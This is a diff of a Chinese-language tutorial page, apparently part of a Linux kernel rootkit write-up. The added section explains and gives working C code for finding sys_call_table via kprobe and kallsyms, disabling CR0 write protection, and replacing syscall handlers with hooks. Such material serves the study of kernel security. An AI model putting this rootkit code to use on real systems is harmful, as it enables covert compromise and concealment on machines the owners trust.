@@ -311,6 +311,67 @@ void<span class="w"> </span>module_hide<span class="o">(</span>void<span class="
 <h5>怎么HOOK与HOOK哪些函数</h5>
 <p>在内核之中，存在一个系统调用表。其中的系统调用编号（系统调用发生时rax的值）是其Handler在其表中的偏移量。
 系统调用表位于sys_call_table，它是系统内核的一块区间，其作用是将调用号和服务函数连接起来，当系统调用某一个syscall，就会通过sys_call_table查找到该服务函数。</p>
+<p>系统调用表是只读的，在内核中，CR0是一个控制寄存器，可以修改处理器的操作方式。其中的第16位是写保护标志所在的位置，如果该标志为0，CPU就可以让内核写入只读区域。Linux为我们提供了两个很有帮助的函数，可以用于修改CR0寄存器，分别是write_cr0和read_cr0。</p>
+<p>这段代码的功能主要是找到sys_call_table的地址，由于内核版本不用，新版本内核用到了kprobe：</p>
+<ul>
+<li>获取kallsyms_lookup_name函数的地址，用于后续查找内核符号。</li>
+<li>查找并获取sys_call_table的地址，用于系统调用表的修改。</li>
+</ul>
+<div class="highlight"><pre><span></span><code>int<span class="w"> </span>sys_call_table_init<span class="o">(</span>void<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>/*<span class="w"> </span>lookup<span class="w"> </span>address<span class="w"> </span>of<span class="w"> </span>kallsyms_lookup_name<span class="o">()</span><span class="w"> </span>*/
+<span class="c1">#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5, 7, 0)</span>
+<span class="w">    </span>struct<span class="w"> </span>kprobe<span class="w"> </span><span class="nv">kp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span>.symbol_name<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"kallsyms_lookup_name"</span><span class="o">}</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>register_kprobe<span class="o">(</span><span class="p">&amp;</span>kp<span class="o">)</span><span class="w"> </span>&lt;<span class="w"> </span><span class="m">0</span><span class="o">)</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span>-EFAULT<span class="p">;</span>
+<span class="w">    </span><span class="nv">kallsyms_lookup_name_ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>kallsyms_lookup_name_t<span class="o">)</span>kp.addr<span class="p">;</span>
+<span class="w">    </span>unregister_kprobe<span class="o">(</span><span class="p">&amp;</span>kp<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!kallsyms_lookup_name_ref<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>pr_err<span class="o">(</span>LOG_PREFIX<span class="w"> </span><span class="s2">"failed to lookup function kallsyms_lookup_name()\n"</span><span class="o">)</span><span class="p">;</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span>-EFAULT<span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+<span class="c1">#else</span>
+<span class="w">    </span><span class="nv">kallsyms_lookup_name_ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>kallsyms_lookup_name<span class="p">;</span>
+<span class="c1">#endif</span>
+
+<span class="w">    </span>/*<span class="w"> </span>lookup<span class="w"> </span>address<span class="w"> </span>of<span class="w"> </span>sys_call_table<span class="w"> </span>*/
+<span class="w">    </span><span class="nv">sys_call_table_ref</span><span class="w"> </span><span class="o">=</span>
+<span class="w">        </span><span class="o">(</span>t_syscall<span class="w"> </span>*<span class="o">)</span>kallsyms_lookup_name_ref<span class="o">(</span><span class="s2">"sys_call_table"</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!sys_call_table_ref<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>pr_err<span class="o">(</span>LOG_PREFIX<span class="w"> </span><span class="s2">"failed to lookup symbol: sys_call_table\n"</span><span class="o">)</span><span class="p">;</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span>-EFAULT<span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div>
+<p>这段代码的功能是将系统调用表中的某个系统调用替换为自定义的函数:</p>
+<ul>
+<li>读取并保存当前CR0寄存器值。</li>
+<li>将原系统调用保存到orig_fn。</li>
+<li>修改CR0寄存器以允许写入系统调用表。</li>
+<li>替换系统调用表中的指定系统调用为新函数。</li>
+<li>恢复CR0寄存器值。</li>
+</ul>
+<div class="highlight"><pre><span></span><code>static<span class="w"> </span>inline<span class="w"> </span>void<span class="w"> </span>write_cr0_forced<span class="o">(</span>unsigned<span class="w"> </span>long<span class="w"> </span>val<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>unsigned<span class="w"> </span>long<span class="w"> </span>__force_order<span class="p">;</span>
+<span class="w">    </span>asm<span class="w"> </span>volatile<span class="o">(</span><span class="s2">"mov %0, %%cr0"</span><span class="w"> </span>:<span class="w"> </span><span class="s2">"+r"</span><span class="o">(</span>val<span class="o">)</span>,<span class="w"> </span><span class="s2">"+m"</span><span class="o">(</span>__force_order<span class="o">))</span><span class="p">;</span>
+<span class="o">}</span>
+
+void<span class="w"> </span>hook_sys_call_table<span class="o">(</span>long<span class="w"> </span>int<span class="w"> </span>sysno,<span class="w"> </span>t_syscall<span class="w"> </span>hook_fn,
+<span class="w">                         </span>t_syscall<span class="w"> </span>*orig_fn<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>unsigned<span class="w"> </span>long<span class="w"> </span>cr0<span class="p">;</span>
+<span class="w">    </span>pr_info<span class="o">(</span>LOG_PREFIX<span class="w"> </span><span class="s2">"hook syscall number %ld"</span>,<span class="w"> </span>sysno<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!sys_call_table_ref<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>pr_warn<span class="o">(</span>LOG_PREFIX
+<span class="w">                </span><span class="s2">"address of sys_call_table was not found, skip hook\n"</span><span class="o">)</span><span class="p">;</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+<span class="w">    </span><span class="nv">cr0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>read_cr0<span class="o">()</span><span class="p">;</span>
+<span class="w">    </span>*orig_fn<span class="w"> </span><span class="o">=</span><span class="w"> </span>sys_call_table_ref<span class="o">[</span>sysno<span class="o">]</span><span class="p">;</span>
+<span class="w">    </span>write_cr0_forced<span class="o">(</span>cr0<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>~0x00010000<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span>sys_call_table_ref<span class="o">[</span>sysno<span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>hook_fn<span class="p">;</span>
+<span class="w">    </span>write_cr0_forced<span class="o">(</span>cr0<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div>
   </div>
 </article>
 <div id="cyReward" role="cylabs" data-use="reward" style="text-align:center;"></div>
